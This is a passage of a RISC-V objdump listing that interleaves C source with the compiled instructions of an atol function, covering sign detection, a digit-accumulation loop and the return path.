    80002692:	06f71263          	bne	a4,a5,800026f6 <atol+0xb4>
    sign = *str == '-';
    80002696:	fd843783          	ld	a5,-40(s0)
    8000269a:	0007c783          	lbu	a5,0(a5)
    8000269e:	0007871b          	sext.w	a4,a5
    800026a2:	02d00793          	li	a5,45
    800026a6:	40f707b3          	sub	a5,a4,a5
    800026aa:	0017b793          	seqz	a5,a5
    800026ae:	0ff7f793          	andi	a5,a5,255
    800026b2:	fef42223          	sw	a5,-28(s0)
    str++;
    800026b6:	fd843783          	ld	a5,-40(s0)
    800026ba:	0785                	addi	a5,a5,1
    800026bc:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800026c0:	a81d                	j	800026f6 <atol+0xb4>
    res *= 10;
    800026c2:	fe843703          	ld	a4,-24(s0)
    800026c6:	87ba                	mv	a5,a4
    800026c8:	078a                	slli	a5,a5,0x2
    800026ca:	97ba                	add	a5,a5,a4
    800026cc:	0786                	slli	a5,a5,0x1
    800026ce:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800026d2:	fd843783          	ld	a5,-40(s0)
    800026d6:	00178713          	addi	a4,a5,1
    800026da:	fce43c23          	sd	a4,-40(s0)
    800026de:	0007c783          	lbu	a5,0(a5)
    800026e2:	2781                	sext.w	a5,a5
    800026e4:	fd07879b          	addiw	a5,a5,-48
    800026e8:	2781                	sext.w	a5,a5
    800026ea:	873e                	mv	a4,a5
    800026ec:	fe843783          	ld	a5,-24(s0)
    800026f0:	97ba                	add	a5,a5,a4
    800026f2:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    800026f6:	fd843783          	ld	a5,-40(s0)
    800026fa:	0007c783          	lbu	a5,0(a5)
    800026fe:	f3f1                	bnez	a5,800026c2 <atol+0x80>
  }

  return sign ? -res : res;
    80002700:	fe442783          	lw	a5,-28(s0)
    80002704:	2781                	sext.w	a5,a5
    80002706:	c791                	beqz	a5,80002712 <atol+0xd0>
    80002708:	fe843783          	ld	a5,-24(s0)
    8000270c:	40f007b3          	neg	a5,a5
    80002710:	a019                	j	80002716 <atol+0xd4>
    80002712:	fe843783          	ld	a5,-24(s0)
}
    80002716:	853e                	mv	a0,a5
    80002718:	7422                	ld	s0,40(sp)
    8000271a:	6145                	addi	sp,sp,48
    8000271c:	8082                	ret
